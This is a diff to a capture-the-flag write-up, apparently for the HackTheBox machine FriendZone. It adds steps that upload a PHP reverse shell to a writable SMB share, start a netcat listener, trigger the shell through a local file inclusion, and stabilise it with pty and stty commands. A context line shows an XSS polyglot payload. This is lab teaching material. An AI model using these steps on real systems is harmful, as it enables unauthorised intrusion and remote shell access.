@@ -243,13 +243,47 @@ jaVasCript:/-///'/"/*/(//oNcliCk=alert(1) )//%0D%0A%0d%0a //</stYle/</titLe/</te
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9e45d00f-2dc9-44cc-866f-6f3246b21fc1)
 
+
 ### pagename
++ Remember duration of the enumeration phase, we discovered the **Development** share with READ and WRITE permissions from SMB, and it's likely that the files uploaded on that share are stored in the location /etc/Development based on the **Comments** column.
++ Try to upload a php revershell file, and then exploit the LFI vulnerability to get a reverse shell.
++ Log into the Development share: `smbclient -N //10.10.10.123/Development`
++ Transfer the **shell.php** file from the attack machine to the share: `put shell.php`
++ **Alternatively**, `smbclient -N //10.10.10.123/Development -c 'put shell.php'`
++ **Alternatively 2**, `smbclient -N //10.10.10.123/Development -c 'put php-reverse-shell.php shell.php'`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2f395d03-f2e3-4bed-9d56-e62bb5b9aa7d)
+
++ Start a netcat listener on the attack machine: `nc -lnvp 4444`
++ Navigate to `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell` to execute the reverse shell script from the website.
++ Don't forget to remove the **.php** extension of the php file since the application already does that for you.
++ Get a low level shell.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/187e2901-f577-42a9-b14e-9782f24b8989)
+
++ Upgrade it to a better shell, do more stable.
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+script /dev/null -c bash
+CTRL^Z: Ctrl + Z
+stty raw -echo; fg
+reset
+terminal type? 'screen' or 'xterm'
+export TERM=xterm  
+export SHELL=bash
+stty rows 55 columns 285
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/29bb6a71-cbb5-4db0-b5ff-3038f7f9aede)
+
++ Now that we are on an interactive shell, and read the user flag, since the privileges are enough. 
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f63315ec-5a66-49f5-be9f-7a1fa1208b6b)
+
++ Escalate privileges to get the root flag.
 
 
-
-
-
-## Privilege Escalation
+## Privilege Escalation: from 'www-data' to 'friend'
 + xxx
 
 
